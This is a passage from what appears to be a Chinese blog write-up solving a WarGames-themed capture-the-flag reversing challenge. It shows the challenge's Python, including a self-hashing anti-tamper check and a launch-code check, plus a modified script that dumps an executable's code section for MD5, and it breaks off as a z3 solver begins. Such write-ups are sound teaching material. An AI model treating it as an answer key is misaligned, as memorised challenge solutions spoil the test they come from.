class="string">&#x27;ATLANTIC SUDDEN&#x27;</span>, <span class="string">&#x27;MONGOLIAN THRUST&#x27;</span>, <span class="string">&#x27;POLISH DECOY&#x27;</span>, <span class="string">&#x27;ALASKAN DISCRETIONARY&#x27;</span>, <span class="string">&#x27;CANADIAN THRUST&#x27;</span>, <span class="string">&#x27;ARABIAN LIGHT&#x27;</span>, <span class="string">&#x27;S.AFRICAN DOMESTIC&#x27;</span>, <span class="string">&#x27;TUNISIAN INCIDENT&#x27;</span>, <span class="string">&#x27;MALAYSIAN MANEUVER&#x27;</span>, <span class="string">&#x27;JAMAICA DECOY&#x27;</span>, <span class="string">&#x27;MALAYSIAN MINIMAL&#x27;</span>, <span class="string">&#x27;RUSSIAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;CHAD OPTION&#x27;</span>, <span class="string">&#x27;BANGLADESH WAR&#x27;</span>, <span class="string">&#x27;BURMESE CONTAINMENT&#x27;</span>, <span class="string">&#x27;ASIAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;BULGARIAN CLANDESTINE&#x27;</span>, <span class="string">&#x27;GREENLAND INCURSION&#x27;</span>, <span class="string">&#x27;EGYPT SURGICAL&#x27;</span>, <span class="string">&#x27;CZECH HEAVY&#x27;</span>, <span class="string">&#x27;TAIWAN CONFRONTATION&#x27;</span>, <span class="string">&#x27;GREENLAND MAXIMUM&#x27;</span>, <span class="string">&#x27;UGANDA OFFENSIVE&#x27;</span>, <span class="string">&#x27;CASPIAN DEFENSE&#x27;</span>, <span class="string">&#x27;CRIMEAN GAMBIT&#x27;</span>, <span class="string">&#x27;BRITISH ANTICS&#x27;</span>, <span class="string">&#x27;HUNGARIAN EXPULSION&#x27;</span>, <span class="string">&#x27;VENEZUELAN COLLAPSE&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrong</span>():</span></span><br><span class="line">    trust = windll.kernel32.GetModuleHandleW(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    computer = string_at(trust, <span class="number">1024</span>)</span><br><span class="line">    dirty, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    _, _, organize, _, _, _, variety, _ =  struct.unpack_from(<span class="string">&#x27;=IHHIIIHH&#x27;</span>, computer, dirty)</span><br><span class="line">    <span class="keyword">assert</span> variety &gt;= <span class="number">144</span></span><br><span class="line"></span><br><span class="line">    participate, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, dirty + <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> insurance <span class="keyword">in</span> range(organize):</span><br><span class="line">        name, tropical, inhabitant, reader, chalk, _, _, _, _, _ = struct.unpack_from(<span class="string">&#x27;=8sIIIIIIHHI&#x27;</span>, computer, <span class="number">40</span> * insurance + dirty + variety + <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">if</span> inhabitant &lt;= participate &lt; inhabitant + tropical:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    spare = bytearray(string_at(trust + inhabitant, tropical))</span><br><span class="line">    </span><br><span class="line">    issue, digital = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, computer, dirty + <span class="number">0xa0</span>)</span><br><span class="line">    truth = string_at(trust + issue, digital)</span><br><span class="line"></span><br><span class="line">    expertise = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> expertise &lt;= len(truth) - <span class="number">8</span>:</span><br><span class="line">        nuance, seem = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, truth, expertise)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nuance == <span class="number">0</span> <span class="keyword">and</span> seem == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        slot = truth[expertise + <span class="number">8</span>:expertise + seem]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(slot) &gt;&gt; <span class="number">1</span>):</span><br><span class="line">            diet, = struct.unpack_from(<span class="string">&#x27;=H&#x27;</span>, slot, <span class="number">2</span> * i)</span><br><span class="line">            fabricate = diet &gt;&gt; <span class="number">12</span></span><br><span class="line">            <span class="keyword">if</span> fabricate != <span class="number">3</span>: <span class="keyword">continue</span></span><br><span class="line">            diet = diet &amp; <span class="number">4095</span></span><br><span class="line">            ready = nuance + diet - inhabitant</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= ready &lt; len(spare): </span><br><span class="line">                struct.pack_into(<span class="string">&#x27;=I&#x27;</span>, spare, ready, struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, spare, ready)[<span class="number">0</span>] - trust)</span><br><span class="line"></span><br><span class="line">        expertise += seem</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(spare).digest()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Terminal</span>(<span class="params">object</span>):</span></span><br><span class="line">        </span><br><span class="line">    DELAY = <span class="number">0.02</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> text.splitlines(<span class="literal">True</span>):</span><br><span class="line">            sys.stdout.write(line)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            time.sleep(self.DELAY)     </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">typewrite</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                sys.stdout.write(char)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                time.sleep(self.DELAY)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sys.stdout.write(char.lower())</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                time.sleep(self.DELAY)</span><br><span class="line">                sys.stdout.write(<span class="string">&#x27;\b&#x27;</span> + char)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">typewriteln</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        self.typewrite(text + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;&#x27;</span>.join(_ <span class="keyword">for</span> _ <span class="keyword">in</span> input().upper() <span class="keyword">if</span> _ <span class="keyword">in</span> <span class="string">&#x27; 0123456789ABCDEFGHIJKLMNOPQRSTUVWXZY?&#x27;</span>).split())</span><br><span class="line">t = Terminal()</span><br><span class="line"></span><br><span class="line">xor = [<span class="number">212</span>, <span class="number">162</span>, <span class="number">242</span>, <span class="number">218</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">249</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">187</span>, <span class="number">131</span>, <span class="number">206</span>]</span><br><span class="line">h = list(wrong())</span><br><span class="line">h = [h[i] ^ xor[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">t.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      _/\/\______/\/\____/\/\/\/\____/\/\/\/\/\____/\/\/\/\/\___</span></span><br><span class="line"><span class="string">     _/\/\__/\__/\/\__/\/\____/\/\__/\/\____/\/\__/\/\____/\/\_</span></span><br><span class="line"><span class="string">    _/\/\/\/\/\/\/\__/\/\____/\/\__/\/\/\/\/\____/\/\/\/\/\___</span></span><br><span class="line"><span class="string">   _/\/\/\__/\/\/\__/\/\____/\/\__/\/\__________/\/\__/\/\___</span></span><br><span class="line"><span class="string">  _/\/\______/\/\____/\/\/\/\____/\/\__________/\/\____/\/\_</span></span><br><span class="line"><span class="string"> __________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t.typewrite(<span class="string">&#x27;GREETINGS PROFESSOR FALKEN.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t.typewrite(<span class="string">&#x27;\n&gt; &#x27;</span>)</span><br><span class="line">    cmd = t.read()</span><br><span class="line">    <span class="keyword">if</span> cmd.rstrip(<span class="string">&#x27;!?&#x27;</span>) <span class="keyword">in</span> GREETINGS:</span><br><span class="line">        t.typewriteln(random.choice(GREETINGS))</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;HELP GAMES&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&quot;&#x27;GAMES&#x27; REFERS TO MODELS, SIMULATIONS AND GAMES\nWHICH HAVE TACTICAL AND STRATEGIC APPLICATIONS.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;LIST GAMES&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;FALKEN\&#x27;S MAZE\nTIC-TAC-TOE\nGLOBAL THERMONUCLEAR WAR&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd <span class="keyword">in</span> (<span class="string">&#x27;HELP&#x27;</span>, <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;AVAILABLE COMMANDS:\nHELP\nHELP GAMES\nLIST GAMES\nPLAY &lt;game&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;HELP &#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;HELP NOT AVAILABLE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;PLAY&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;WHICH GAME?&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY F&#x27;</span>) <span class="keyword">or</span> cmd == <span class="string">&#x27;PLAY 1&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;GAME IS TEMPORARILY UNAVAILABLE DUE TO MAINTENANCE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY T&#x27;</span>) <span class="keyword">or</span> cmd == <span class="string">&#x27;PLAY 2&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;GAME IS TEMPORARILY UNAVAILABLE DUE TO MAINTENANCE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY G&#x27;</span>) <span class="keyword">or</span> cmd <span class="keyword">in</span> (<span class="string">&#x27;PLAY ARMAGEDDON&#x27;</span>, <span class="string">&#x27;PLAY 3&#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;*** GAME ROUTINE RUNNING ***&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY &#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;THAT GAME IS NOT AVAILABLE&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;COMMAND NOT RECOGNIZED&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">r&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;7ooooo&quot;&quot;&quot;oooooo&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;7</span></span><br><span class="line"><span class="string">|           .__Looooooo &quot;&quot;7oooooooo`     &#x27;ooo&quot;   &quot;&quot;._,    .JooL_,    .___     |</span></span><br><span class="line"><span class="string">o  __L______oLoooooooo7o_, |oooor&quot;&quot;       ._____,,Jo__JoooooooooooooJoooL_____J</span></span><br><span class="line"><span class="string">r7._ooooooooooooooo&quot;JoJoo|  oor   &#x27;o`   .Jooo7oooooooooooooooooooooooooooo&quot;oo&quot;7</span></span><br><span class="line"><span class="string">| &#x27;`&quot;&#x27;`   ooooooooooL,Jooo_,         _oL.ooLoooooooooooooooooooooooooo_  |r`  |</span></span><br><span class="line"><span class="string">|         &#x27;&#x27;ooooooooooooooJo         &quot;&quot;oooooooooor&quot;ooooooooooooooooooo7       |</span></span><br><span class="line"><span class="string">|           7oooooooooo&quot;             |or`oo&#x27;ooJoJo |ooooooooooooooro ./       |</span></span><br><span class="line"><span class="string">|            &quot;oooooo7o`              JooooJ_JLJoooLJoooooooooooooo, or        |</span></span><br><span class="line"><span class="string">|             &#x27;&quot;oo|  oo            .oooooooooooroooJo&quot;7oooooooooo7,           |</span></span><br><span class="line"><span class="string">|   &quot;&quot;          &quot;&quot;`oorL|L,         |ooooooooooooooo&quot;`  7or` 7ooo |,           |</span></span><br><span class="line"><span class="string">|                   &#x27;\_oL__         7ooooooooooooLr     7|   L&quot;` |o|          |</span></span><br><span class="line"><span class="string">|                    .Jooooo|            7ooooooo&quot;       `  &#x27;o|_oL&quot;L          |</span></span><br><span class="line"><span class="string">|                    |oooooooooL         &#x27;oooooo|            &#x27;o_J7Lrooo_J_,   |</span></span><br><span class="line"><span class="string">|                     7oooooooo`          Jooooo|._            &quot;`&quot;7LJ/7r  &quot;`, |</span></span><br><span class="line"><span class="string">|                       oooooor           7oooo|.o|             __oooooo_  _| 7</span></span><br><span class="line"><span class="string">|                      |ooooo             &#x27;ooor  &quot;              7oooooooo|    |</span></span><br><span class="line"><span class="string">|                      Jooor               |o|                  &#x27;&quot;&quot;  &quot;oor    .J</span></span><br><span class="line"><span class="string">|                      oo|                                            &quot;o|   _oo</span></span><br><span class="line"><span class="string">|                     &#x27;or _                           |                     &quot; |</span></span><br><span class="line"><span class="string">|                      &quot;&quot;`                                                    |</span></span><br><span class="line"><span class="string">|                       .,&#x27;                       ___.   .______________      |</span></span><br><span class="line"><span class="string">|        ______________ooo`        ._JLooooooooooooooooooooooooooooooooooooo&quot; |</span></span><br><span class="line"><span class="string">|  |L7ooooooooooooooooL___,.Jo_Jooooooooooooooooooooooooooooooooooooooooooor` |</span></span><br><span class="line"><span class="string">ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AWAITING FIRST STRIKE COMMAND</span></span><br><span class="line"><span class="string">-----------------------------</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">PLEASE SPECIFY PRIMARY TARGET</span></span><br><span class="line"><span class="string">BY CITY AND/OR COUNTRY NAME:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">target = input()</span><br><span class="line"></span><br><span class="line">t.typewriteln(<span class="string">&quot;\nPREPARING NUCLEAR STRIKE FOR &quot;</span> + target.upper())</span><br><span class="line">t.typewrite(<span class="string">&quot;ENTER LAUNCH CODE: &quot;</span>)</span><br><span class="line">launch_code = input().encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># encoding map coordinates</span></span><br><span class="line">x = list(launch_code.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">b = <span class="number">16</span> * [<span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate missile trajectory</span></span><br><span class="line">b[<span class="number">0</span>] = x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">1</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">2</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">3</span>] = x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">4</span>] = x[<span class="number">1</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">5</span>] = x[<span class="number">0</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">6</span>] = x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">7</span>] = x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">8</span>] = x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>]</span><br><span class="line">b[<span class="number">9</span>] = x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">10</span>] = x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">11</span>] = x[<span class="number">0</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">13</span>]</span><br><span class="line">b[<span class="number">12</span>] = x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">13</span>] = x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>]</span><br><span class="line">b[<span class="number">14</span>] = x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>]</span><br><span class="line">b[<span class="number">15</span>] = x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> b == h:</span><br><span class="line">    t.typewriteln(<span class="string">&quot;LAUNCH CODE ACCEPTED.\n\n*** RUNNING SIMULATION ***\n&quot;</span>)</span><br><span class="line">    random.shuffle(STRATEGIES)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(STRATEGIES), <span class="number">6</span>):</span><br><span class="line">        t.write(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">&#x27;&#123;:24&#125; &#123;:8&#125;&#x27;</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> ([(<span class="string">&#x27;STRATEGY:&#x27;</span>, <span class="string">&#x27;WINNER:&#x27;</span>), (<span class="string">&#x27;-&#x27;</span> * <span class="number">24</span>, <span class="string">&#x27;-&#x27;</span> * <span class="number">8</span>)] + [(_, <span class="string">&#x27;NONE&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> STRATEGIES[i:i+<span class="number">6</span>]])) + <span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t.typewriteln(<span class="string">&quot;*** SIMULATION COMPLETED ***\n&quot;</span>)</span><br><span class="line">    t.typewriteln(<span class="string">&#x27;\nA STRANGE GAME.\nTHE ONLY WINNING MOVE IS\nNOT TO PLAY.\n&#x27;</span>)</span><br><span class="line">    eye = [<span class="number">219</span>, <span class="number">232</span>, <span class="number">81</span>, <span class="number">150</span>, <span class="number">126</span>, <span class="number">54</span>, <span class="number">116</span>, <span class="number">129</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">204</span>, <span class="number">119</span>, <span class="number">252</span>, <span class="number">122</span>, <span class="number">3</span>, <span class="number">209</span>, <span class="number">196</span>, <span class="number">15</span>, <span class="number">148</span>, <span class="number">173</span>, <span class="number">206</span>, <span class="number">246</span>, <span class="number">242</span>, <span class="number">200</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">2</span>, <span class="number">102</span>, <span class="number">59</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">23</span>]</span><br><span class="line">    flag = fire(eye, launch_code).decode()</span><br><span class="line">    t.typewrite(<span class="string">f&quot;CONGRATULATIONS! YOU FOUND THE FLAG:\n\n<span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    t.typewrite(<span class="string">&quot;\nIDENTIFICATION NOT RECOGNIZED BY SYSTEM\n--CONNECTION TERMINATED--\n&quot;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822162824.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822162824.png"></a></p><p>当值为0的时候，会取本身进程的句柄，因为是单独跑python脚本的，所以得稍微改下，改成</p><p><code>    trust = pydll.LoadLibrary(r&#39;F:\copy.exe&#39;)._handle</code></p><p>完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrong</span>():</span></span><br><span class="line">    trust = pydll.LoadLibrary(<span class="string">r&#x27;F:\copy.exe&#x27;</span>)._handle</span><br><span class="line"></span><br><span class="line">    computer = string_at(trust, <span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># print(computer)</span></span><br><span class="line"></span><br><span class="line">    dirty, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    _, _, organize, _, _, _, variety, _ =  struct.unpack_from(<span class="string">&#x27;=IHHIIIHH&#x27;</span>, computer, dirty)</span><br><span class="line">    <span class="keyword">assert</span> variety &gt;= <span class="number">144</span></span><br><span class="line"></span><br><span class="line">    participate, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, dirty + <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> insurance <span class="keyword">in</span> range(organize):</span><br><span class="line">        name, tropical, inhabitant, reader, chalk, _, _, _, _, _ = struct.unpack_from(<span class="string">&#x27;=8sIIIIIIHHI&#x27;</span>, computer, <span class="number">40</span> * insurance + dirty + variety + <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">if</span> inhabitant &lt;= participate &lt; inhabitant + tropical:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    spare = bytearray(string_at(trust + inhabitant, tropical))</span><br><span class="line">    </span><br><span class="line">    issue, digital = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, computer, dirty + <span class="number">0xa0</span>)</span><br><span class="line">    truth = string_at(trust + issue, digital)</span><br><span class="line"></span><br><span class="line">    expertise = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> expertise &lt;= len(truth) - <span class="number">8</span>:</span><br><span class="line">        nuance, seem = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, truth, expertise)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nuance == <span class="number">0</span> <span class="keyword">and</span> seem == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        slot = truth[expertise + <span class="number">8</span>:expertise + seem]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(slot) &gt;&gt; <span class="number">1</span>):</span><br><span class="line">            diet, = struct.unpack_from(<span class="string">&#x27;=H&#x27;</span>, slot, <span class="number">2</span> * i)</span><br><span class="line">            fabricate = diet &gt;&gt; <span class="number">12</span></span><br><span class="line">            <span class="keyword">if</span> fabricate != <span class="number">3</span>: <span class="keyword">continue</span></span><br><span class="line">            diet = diet &amp; <span class="number">4095</span></span><br><span class="line">            ready = nuance + diet - inhabitant</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= ready &lt; len(spare): </span><br><span class="line">                struct.pack_into(<span class="string">&#x27;=I&#x27;</span>, spare, ready, struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, spare, ready)[<span class="number">0</span>] - trust)</span><br><span class="line"></span><br><span class="line">        expertise += seem</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;md5.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(spare)</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(spare).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># def main():</span></span><br><span class="line"><span class="comment">#     print wrong().encode(&#x27;hex&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print &#x27;end.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(wrong())</span><br></pre></td></tr></table></figure><p>得到MD5后反算求 lauchcode，利用z3进行求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 